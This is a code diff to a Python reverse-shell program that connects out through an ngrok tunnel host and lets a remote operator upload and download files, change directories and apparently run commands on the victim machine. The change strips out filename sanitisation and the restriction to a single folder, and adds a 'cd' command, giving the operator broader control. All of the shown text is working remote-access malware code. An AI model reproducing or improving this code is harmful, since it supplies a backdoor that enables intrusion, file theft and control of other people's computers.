@@ -491,8 +491,6 @@ def reverse_shell():
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(10)  # ← Timeout to prevent hanging on recv
             s.connect((NGROK_HOST, NGROK_PORT))
-            os.chdir(EXTRACT_FOLDER)
-
 
             def send_data(data):
                 if not isinstance(data, bytes):
@@ -610,28 +608,23 @@ RAM        : {round(psutil.virtual_memory().total / (1024**3), 2)} GB
                         send_data("[!] File not found.")
 
                 elif cmd.startswith("upload "):
-                    raw_name = cmd.split(" ", 1)[1].strip().strip('"')
+                    filename = cmd.split(" ", 1)[1]
+                    with open(filename, "wb") as f:
+                        s.send(b"[+] Ready to receive.\n")
+                        while True:
+                            chunk = s.recv(1024)
+                            if b"ENDFILE" in chunk:
+                                f.write(chunk.replace(b"ENDFILE", b""))
+                                break
+                            f.write(chunk)
+                    send_data(f"[+] Upload complete: {filename}")
 
-                    # Sanitize filename for Windows (no quotes, special chars, etc.)
-                    safe_name = re.sub(r'[<>:"/\\|?*]', '_', raw_name)
-                    safe_name = safe_name.replace(" ", "_")  # optional: convert spaces to underscore
-
-                    # Ensure save path inside EXTRACT_FOLDER
-                    save_path = os.path.join(EXTRACT_FOLDER, safe_name)
-
+                elif cmd.startswith("cd "):
                     try:
-                        with open(save_path, "wb") as f:
-                            s.send(b"[+] Ready to receive.\n")
-                            while True:
-                                chunk = s.recv(1024)
-                                if b"ENDFILE" in chunk:
-                                    f.write(chunk.replace(b"ENDFILE", b""))
-                                    break
-                                f.write(chunk)
-                        send_data(f"[+] Upload complete: {safe_name}")
+                        os.chdir(cmd[3:].strip())
+                        send_data(f"[+] Changed directory to {os.getcwd()}")
                     except Exception as e:
-                        send_data(f"[!] Upload failed: {e}")
-
+                        send_data(f"[!] Failed to change directory: {e}")
 
                 else:
                     try:
